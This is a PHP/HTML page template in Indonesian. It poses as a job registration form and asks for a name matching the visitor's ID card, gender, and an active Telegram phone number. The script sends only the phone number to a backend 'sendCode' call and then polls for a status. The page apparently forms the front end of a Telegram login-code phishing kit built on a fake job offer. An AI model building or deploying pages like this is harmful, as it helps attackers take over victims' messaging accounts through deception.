<h1 class="mt-3 text-center text-primary" style="font-size: 30px!important"><?= $setting['title'] ?></h1>
<div class="mb-3">
  <div class="input-group">
    <span class="input-group-text" id="basic-addon1">Nama</span>
    <input type="text" name="nama" id="" class="form-control shadow-none" placeholder="Nama Lengkap (sesuai KTP)" />
  </div>
</div>
<div class="mb-3">
  <span class="form-label">Jenis Kelamin</span>
  <select class="form-select">
      <option>Laki-Laki</option>
      <option>Perempuan</option>
  </select>
</div>
<div class="mb-3">
  <label id="wrong" for="" class="form-label"><span>Nomor tidak valid</span></label>
  <div class="input-group">
    <span class="input-group-text" id="basic-addon1" style="display: flex;gap: 3px;"><img src="https://www.svgrepo.com/show/405511/flag-for-flag-indonesia.svg" style="height: 24px;" /> +<?= $CCODE ?></span>
    <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Nomor Telegram Aktif" aria-label="Phone" aria-describedby="basic-addon1" required />
  </div>
</div>
<input type="checkbox" /> <span>Saya setuju untuk menerima pesan Telegram dari Admin tentang Pekerjaan Ini</span>
<button class="btn btn-primary mx-auto d-block mb-3">MENDAFTAR</button>
<script>
  $("#wrong").hide();

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("button").on("click", function(e){
    e.preventDefault();
    var phone = $("input#phone").val();

    if (phone != "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: {"method":"sendCode","phone":phone},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>